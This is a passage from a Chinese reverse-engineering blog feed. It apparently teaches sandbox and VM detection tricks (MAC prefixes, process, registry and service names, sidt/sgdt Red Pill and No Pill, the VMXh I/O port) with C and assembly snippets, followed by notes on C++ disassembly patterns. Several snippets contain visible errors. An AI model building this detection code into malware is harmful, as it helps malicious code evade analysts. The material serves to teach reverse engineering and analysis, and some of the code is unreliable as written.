    <content type="html"><![CDATA[<h2 id="VMware痕迹"><a href="#VMware痕迹" class="headerlink" title="VMware痕迹"></a>VMware痕迹</h2><ul><li><p>1.检测Mac地址，以00:05:69、00:0c:29和00:50:56开始的MAC地址与VMware相对应；以00:03:ff开始的MAC地址与virtualpc对应；以08:00:27开始的MAC地址与virtualbox对应。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">BOOL CheckVMWare()  </div><div class="line">&#123;  </div><div class="line">    string <span class="keyword">mac</span>;  </div><div class="line">    get_3part_mac(<span class="keyword">mac</span>);    <span class="comment">//res =ioctl(sock,SIOCGIFHWADDR,&amp;ifr)获取Mac地址</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">mac</span>==<span class="string">"00-05-69"</span> || <span class="keyword">mac</span>==<span class="string">"00-0c-29"</span> || <span class="keyword">mac</span>==<span class="string">"00-50-56"</span>||<span class="keyword">mac</span>==<span class="string">"00-03-ff"</span>||<span class="keyword">mac</span>=="08-00-27)  </div><div class="line">    &#123;  </div><div class="line">        <span class="keyword">return</span> TRUE;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">else</span>  </div><div class="line">    &#123;  </div><div class="line">        <span class="keyword">return</span> FALSE;  </div><div class="line">    &#125;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>2.板序列号、主机型号、系统盘所在磁盘名称等其他硬件信息</p></li><li><p>3.根据当前进程信息，通过进程快照读取当前进程信息，查找是否存在虚拟机中特有的进程，如VMware中的<code>vmware.exe</code>和VirtualBox中的<code>VBoxService.exe</code>。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL </span>CheckVMWare()  </div><div class="line">&#123;  </div><div class="line">    DWORD ret = <span class="number">0</span><span class="comment">;  </span></div><div class="line">    PROCESSENTRY32 pe32<span class="comment">;  </span></div><div class="line">    pe32.dwSize = sizeof(pe32)<span class="comment">;   </span></div><div class="line">    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>)<span class="comment">;   </span></div><div class="line">    if(hProcessSnap == INVALID_HANDLE_VALUE)   </div><div class="line">    &#123;   </div><div class="line">        return FALSE<span class="comment">;   </span></div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">BOOL </span><span class="keyword">bMore </span>= Process<span class="number">32F</span>irst(hProcessSnap, &amp;pe32)<span class="comment">;   </span></div><div class="line">    while(<span class="keyword">bMore) </span> </div><div class="line">    &#123; </div><div class="line">        if (!strcmp(pe32.szExeFile, <span class="string">"vmware.exe"</span>)<span class="title">||</span>!strcmp(pe32.szExeFile, <span class="string">"VBoxService.exe"</span>))  </div><div class="line">        &#123;  </div><div class="line">            return TRUE<span class="comment">;  </span></div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">bMore </span>= Process32Next(hProcessSnap, &amp;pe32)<span class="comment">;   </span></div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">CloseHandle(hProcessSnap); </span> </div><div class="line">    return FALSE<span class="comment">;  </span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>4.根据特定的文件夹或文件信息,通过查找磁盘中是否存在特定的文件夹或文件，判断当前是否在虚拟机中。VMware虚拟机中通常会有路径C:\Program Files\VMware\VMware Tools\；VirtualBox虚拟机中通常会有路径C:\Program Files\Oracle\VirtualBox Guest Additions\。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">BOOL CheckVMware()  </div><div class="line">&#123; </div><div class="line">    if (!PathIsDirectory(<span class="string">"C:<span class="subst">\\</span>Program Files<span class="subst">\\</span>VMware<span class="subst">\\</span>VMware Tools<span class="subst">\\</span>"</span>)||!PathIsDirectory(<span class="string">"C:<span class="subst">\\</span>Program Files<span class="subst">\\</span>Oracle<span class="subst">\\</span>VirtualBox Guest Additions<span class="subst">\\</span>"</span>) )  </div><div class="line">    &#123;  </div><div class="line">        return <span class="literal">FALSE</span>;  </div><div class="line">    &#125;  </div><div class="line">    else  </div><div class="line">    &#123;  </div><div class="line">        return <span class="literal">TRUE</span>;  </div><div class="line">    &#125;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>5.根据特定注册表信息,通过读取主机具有虚拟机特性的注册表位置来判断是否处于虚拟机环境中。针对VMware可以判断注册表项HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe；针对VirtualBox可以判断注册表项HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> CheckVMWare()  </div><div class="line">&#123;  </div><div class="line">    HKEY hkey;  </div><div class="line">    <span class="keyword">if</span> (RegOpenKey(HKEY_CLASSES_ROOT, <span class="string">"\\Applications\\VMwareHostOpen.exe"</span>, &amp;hkey) == ERROR_SUCCESS)  </div><div class="line">    &#123;  </div><div class="line">        <span class="keyword">return</span> <span class="literal">TRUE</span>;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">else</span>  </div><div class="line">    &#123;  </div><div class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;  </div><div class="line">    &#125;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>6.根据特定服务名,通过获取主机当前具有VMware特性的服务信息，判断当前主机是否为虚拟机。在VMware中通常会存在VMware物理磁盘助手服务和VMware Tools服务等；在VirtualBox中通常会存在VirtualBox Guest Additions Service服务等。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">CheckVMWare</span><span class="params">()</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    <span class="keyword">int</span> menu = <span class="number">0</span>;    </div><div class="line">    <span class="comment">//打开系统服务控制器    </span></div><div class="line">    SC_HANDLE SCMan = OpenSCManager(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ENUMERATE_SERVICE);   </div><div class="line">    <span class="keyword">if</span>(SCMan == <span class="literal">NULL</span>)    </div><div class="line">    &#123; </div><div class="line">        <span class="built_in">cout</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">endl</span>;  </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"OpenSCManager Eorror/n"</span>);    </div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </div><div class="line">    &#125;    </div><div class="line">    <span class="comment">//保存系统服务的结构  </span></div><div class="line">    LPENUM_SERVICE_STATUSA service_status;     </div><div class="line">    DWORD cbBytesNeeded = <span class="literal">NULL</span>;     </div><div class="line">    DWORD ServicesReturned = <span class="literal">NULL</span>;    </div><div class="line">    DWORD ResumeHandle = <span class="literal">NULL</span>;    </div><div class="line">    service_status = (LPENUM_SERVICE_STATUSA)LocalAlloc(LPTR, <span class="number">1024</span> * <span class="number">64</span>);    </div><div class="line">    <span class="comment">//获取系统服务的简单信息    </span></div><div class="line">    <span class="keyword">bool</span> ESS = EnumServicesStatusA(SCMan, <span class="comment">//系统服务句柄    </span></div><div class="line">        SERVICE_WIN32, <span class="comment">//服务的类型    </span></div><div class="line">        SERVICE_STATE_ALL,  <span class="comment">//服务的状态    </span></div><div class="line">        (LPENUM_SERVICE_STATUSA)service_status,  <span class="comment">//输出参数，系统服务的结构    </span></div><div class="line">        <span class="number">1024</span> * <span class="number">64</span>,  <span class="comment">//结构的大小    </span></div><div class="line">        &amp;cbBytesNeeded, <span class="comment">//输出参数，接收返回所需的服务    </span></div><div class="line">        &amp;ServicesReturned, <span class="comment">//输出参数，接收返回服务的数量    </span></div><div class="line">        &amp;ResumeHandle); <span class="comment">//输入输出参数，第一次调用必须为0，返回为0代表成功    </span></div><div class="line">    <span class="keyword">if</span>(ESS == <span class="literal">NULL</span>)     </div><div class="line">    &#123;    </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"EnumServicesStatus Eorror/n"</span>);    </div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </div><div class="line">    &#125;    </div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ServicesReturned; i++)    </div><div class="line">    &#123;    </div><div class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(service_status[i].lpDisplayName, <span class="string">"VMware Tools"</span>)!=<span class="literal">NULL</span> || <span class="built_in">strstr</span>(service_status[i].lpDisplayName, <span class="string">"VMware 物理磁盘助手服务"</span>)!=<span class="literal">NULL</span>||<span class="built_in">strstr</span>(service_status[i].lpDisplayName, <span class="string">"Virtual Machine"</span>)!=<span class="literal">NULL</span>)  </div><div class="line">        &#123;  </div><div class="line">            <span class="keyword">return</span> TRUE;  </div><div class="line">        &#125;  </div><div class="line">    &#125;    </div><div class="line">    <span class="comment">//关闭服务管理器的句柄   </span></div><div class="line">    CloseServiceHandle(SCMan);   </div><div class="line">    <span class="keyword">return</span> FALSE;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h2 id="漏洞指令"><a href="#漏洞指令" class="headerlink" title="漏洞指令"></a>漏洞指令</h2><ul><li><p>Red Pill<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Red Pill通过运行sidt指令获取IDTR寄存器的值。虚拟机监视器必须重新定位Guest系统的IDTR，来避免与Host系统的IDTR冲突。因为在虚拟机中运行sidt指令时，虚拟机监视器不会得到通知，所以会返回虚拟机的IDTR。Red Pill通过测试这种差异来探测Vmware的使用。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果检测到了sidt这个指令，说明很可能采用了反虚拟机技术</p></li><li><p>No Pill<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sgdt和sldt指令探测VMware的技术通常被称为No Pill</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">BOOL CheckVMWare()  </div><div class="line">&#123;  </div><div class="line">    ULONG xdt = <span class="number">0</span> <span class="comment">;  </span></div><div class="line">    ULONG InVM = <span class="number">0</span><span class="comment">;  </span></div><div class="line">    __asm  </div><div class="line">    &#123;  </div><div class="line">        <span class="keyword">push</span> <span class="built_in">edx</span>  </div><div class="line">        <span class="keyword">sidt</span> [<span class="built_in">esp</span>-<span class="number">2</span>]  </div><div class="line">        <span class="keyword">pop</span> <span class="built_in">edx</span>  </div><div class="line">        <span class="keyword">nop</span>  </div><div class="line">        <span class="keyword">mov</span> xdt , <span class="built_in">edx</span>  </div><div class="line">    &#125;  </div><div class="line">    if (xdt &gt; <span class="number">0xd0000000</span>)  </div><div class="line">    &#123;  </div><div class="line">        InVM = <span class="number">1</span><span class="comment">; </span></div><div class="line">    &#125;  </div><div class="line">    else  </div><div class="line">    &#123;  </div><div class="line">        InVM = <span class="number">0</span><span class="comment">;  </span></div><div class="line">    &#125;  </div><div class="line">    __asm  </div><div class="line">    &#123;  </div><div class="line">        <span class="keyword">push</span> <span class="built_in">edx</span>  </div><div class="line">        <span class="keyword">sgdt</span> [<span class="built_in">esp</span>-<span class="number">2</span>]  </div><div class="line">        <span class="keyword">pop</span> <span class="built_in">edx</span>  </div><div class="line">        <span class="keyword">nop</span>  </div><div class="line">        <span class="keyword">mov</span> xdt , <span class="built_in">edx</span>  </div><div class="line">    &#125;  </div><div class="line">    if (xdt &gt; <span class="number">0xd0000000</span>)  </div><div class="line">    &#123;  </div><div class="line">        InVM += <span class="number">1</span><span class="comment">;  </span></div><div class="line">    &#125;  </div><div class="line">    if (InVM == <span class="number">0</span>)  </div><div class="line">    &#123;  </div><div class="line">        return FALSE<span class="comment">;  </span></div><div class="line">    &#125;  </div><div class="line">    else  </div><div class="line">    &#123;  </div><div class="line">        return TRUE<span class="comment">;  </span></div><div class="line">    &#125;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过禁用VMware加速可以防止No Pill技术的探测</p><ul><li><p>查询IO端口</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">BOOL CheckVMWare()  </div><div class="line">&#123;  </div><div class="line">    bool rc = true<span class="comment">;  </span></div><div class="line">    __try  </div><div class="line">    &#123;  </div><div class="line">        __asm  </div><div class="line">        &#123;  </div><div class="line">            <span class="keyword">push</span>   <span class="built_in">edx</span>  </div><div class="line">            <span class="keyword">push</span>   <span class="built_in">ecx</span>  </div><div class="line">            <span class="keyword">push</span>   <span class="built_in">ebx</span>    </div><div class="line">            <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="string">'VMXh'</span>  //Magic数</div><div class="line">            <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="number">0</span>    </div><div class="line">            <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="number">10</span>   </div><div class="line">            <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="string">'VX'</span>    //指定端口<span class="number">0x5668</span></div><div class="line">            <span class="keyword">in</span>     <span class="built_in">eax</span>, <span class="built_in">dx</span>      //返回值放入<span class="built_in">ebx</span></div><div class="line">            <span class="keyword">cmp</span>    <span class="built_in">ebx</span>, <span class="string">'VMXh'</span>   //返回值与Magic比较，为<span class="number">1</span>则处于虚拟机中</div><div class="line">            <span class="keyword">setz</span>   [rc]   </div><div class="line">            <span class="keyword">pop</span>    <span class="built_in">ebx</span>  </div><div class="line">            <span class="keyword">pop</span>    <span class="built_in">ecx</span>  </div><div class="line">            <span class="keyword">pop</span>    <span class="built_in">edx</span>  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">    __except(EXCEPTION_EXECUTE_HANDLER)    </div><div class="line">    &#123;  </div><div class="line">        rc = false<span class="comment">;  </span></div><div class="line">    &#125;  </div><div class="line">    return rc<span class="comment">;  </span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>总结：如下特权指令可以被用于反虚拟机，但是一般不使用：<code>sidt,sgdt,sldt,snsw,str,in,cpuid</code></p><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2></li><li>1.不安装vmware tools</li><li>2.不使用vm加速</li><li>3.分析时，检查特权指令，nop</li><li>4.不建议修改vmx文件，这是不高效的。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;VMware痕迹&quot;&gt;&lt;a href=&quot;#VMware痕迹&quot; class=&quot;headerlink&quot; title=&quot;VMware痕迹&quot;&gt;&lt;/a&gt;VMware痕迹&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;1.检测Mac地址，以00:05:69、00:0c:29和00:50:56
      
    
    </summary>
    
      <category term="逆向工程" scheme="http://yoursite.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>C++反汇编及逆向分析技术</title>
    <link href="http://yoursite.com/2019/01/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E5%8F%8A%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2019/01/31/C++反汇编及逆向分析技术/</id>
    <published>2019-01-31T07:02:11.000Z</published>
    <updated>2019-01-31T04:13:11.520Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引用反汇编"><a href="#引用反汇编" class="headerlink" title="引用反汇编"></a>引用反汇编</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> &amp;nVar)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">nVar++;</div><div class="line">&#125;</div></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">4</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]</div><div class="line"><span class="keyword">add</span> <span class="built_in">ecx</span>,<span class="number">1</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]    <span class="comment">;解引用</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span>],<span class="built_in">ecx</span>      <span class="comment">;赋值</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于C++使用引用的情况，对于引用变量的修改是修改实参类型本身，第二：此时使用引用本身也会占据内存。</p><h2 id="常数"><a href="#常数" class="headerlink" title="常数"></a>常数</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;常量保存在常量数据区，一般在编译的时候就确定了数值，不可进行修改，<strong>常量首地址-基地址=Offset</strong>，这对应于在文件中的地址。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>#define和const的区别在于</strong>const是依赖于编译器在编译时期做检查，是一个伪常量。可以在运行时期利用指针做修改。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> a=<span class="number">5</span>;</div><div class="line"><span class="keyword">int</span> *Pa=&amp;a;   <span class="comment">//指针</span></div><div class="line">*Pa=<span class="number">6</span>;        <span class="comment">//修改</span></div></pre></td></tr></table></figure></p><h1 id="条件表达式"><a href="#条件表达式" class="headerlink" title="条件表达式"></a>条件表达式</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一种情况，返回值的差为1<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> fun(<span class="keyword">int</span> a)</div><div class="line">&#123;</div><div class="line">return a==<span class="number">5</span>??<span class="number">5</span>:<span class="number">6</span><span class="comment">;</span></div><div class="line">&#125;</div><div class="line">//反汇编如下：</div><div class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line"><span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="number">5</span></div><div class="line"><span class="keyword">setne</span> <span class="built_in">al</span> <span class="comment">;如果zf=1，al=0，如果zf=0，则al=1</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">5</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二种情况，返回值的差大于1<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> fun(<span class="keyword">int</span> a)</div><div class="line">&#123;</div><div class="line">return a==<span class="number">5</span>??<span class="number">4</span>:<span class="number">10</span><span class="comment">;</span></div><div class="line">&#125;</div><div class="line">//反汇编如下：</div><div class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line"><span class="keyword">sub</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="number">5</span>   <span class="comment">;确定zf的数值</span></div><div class="line"><span class="keyword">neg</span> <span class="built_in">eax</span></div><div class="line"><span class="keyword">sbb</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>     <span class="comment">;eax=eax-eax-zf,eax=0x00000000或者0xffffffff</span></div><div class="line"><span class="keyword">and</span> <span class="built_in">eax</span>，<span class="number">6</span>      <span class="comment">;如果eax=0xf，则结果为6，如果eax=0x0，则结果为0</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">4</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三种情况，无优化<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> fun(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</div><div class="line">&#123;</div><div class="line">return a?<span class="number">8</span>:n<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">//反汇编如下：</div><div class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line"><span class="keyword">cmp</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="number">0</span></div><div class="line"><span class="keyword">je</span> xxxxx</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">8</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"><span class="symbol">xxxx:</span><span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">0xc</span>]</div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p><h2 id="if—else-switch"><a href="#if—else-switch" class="headerlink" title="if—else/switch"></a>if—else/switch</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch语句和if-else语句反汇编的差异在于if语句后面接的是判断成立的语句块，判断条件不是在一块的，而switch语句判断条件是在一起的。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">switch(a)</div><div class="line">&#123;</div><div class="line">case <span class="number">1</span>:</div><div class="line">b=<span class="number">1</span><span class="comment">;</span></div><div class="line">case <span class="number">2</span>:</div><div class="line">        b=<span class="number">2</span><span class="comment">;</span></div><div class="line">    case <span class="number">3</span>:</div><div class="line">        b=<span class="number">3</span><span class="comment">;</span></div><div class="line">&#125;</div><div class="line">//反汇编如下</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>,[<span class="built_in">ebp</span>-<span class="number">8</span>]</div><div class="line"><span class="keyword">mov</span> [<span class="built_in">ebp</span>-c],<span class="built_in">ecx</span></div><div class="line"><span class="keyword">cmp</span> [<span class="built_in">ebp</span>-c],<span class="number">1</span></div><div class="line"><span class="keyword">jz</span> xxxx_1</div><div class="line"><span class="keyword">cmp</span> [<span class="built_in">ebp</span>-c],<span class="number">2</span></div><div class="line"><span class="keyword">jz</span> xxxx_2</div><div class="line"><span class="keyword">cmp</span> [<span class="built_in">ebp</span>-c],<span class="number">3</span></div><div class="line"><span class="keyword">jz</span> xxxx_3</div><div class="line"><span class="keyword">jmp</span> xxxx_4</div><div class="line"><span class="symbol">xxxx_1:</span><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">1</span></div><div class="line"><span class="symbol">xxxx_2:</span><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">2</span></div><div class="line"><span class="symbol">xxxx_3:</span><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">3</span></div></pre></td></tr></table></figure></p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">mov reg/mem,xxx      ;赋初值</div><div class="line">jmp For_Cmp          ;跳转到循环条件判断</div><div class="line"><span class="comment">//计算循环步长度</span></div><div class="line"><span class="symbol">For_Step:</span>            </div><div class="line">mov reg,Step</div><div class="line">add reg,xxx         ;运算步长</div><div class="line">mov Step,reg        ;回写</div><div class="line"><span class="comment">//比较步长</span></div><div class="line">For_Cmp：</div><div class="line">mov ecx,Step</div><div class="line">cmp ecx,StepEnd     ;比较终止条件</div><div class="line">jxx For_End</div><div class="line">....                ;循环体</div><div class="line">jmp For_Step        ;回跳到计算循环步长</div><div class="line"><span class="symbol">For_End:</span></div><div class="line">``` </div><div class="line"></div><div class="line"><span class="meta">## 局部静态变量</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;静态变量分为全局静态变量和局部静态变量，全局静态变量和全局变量是一致的。  </div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span 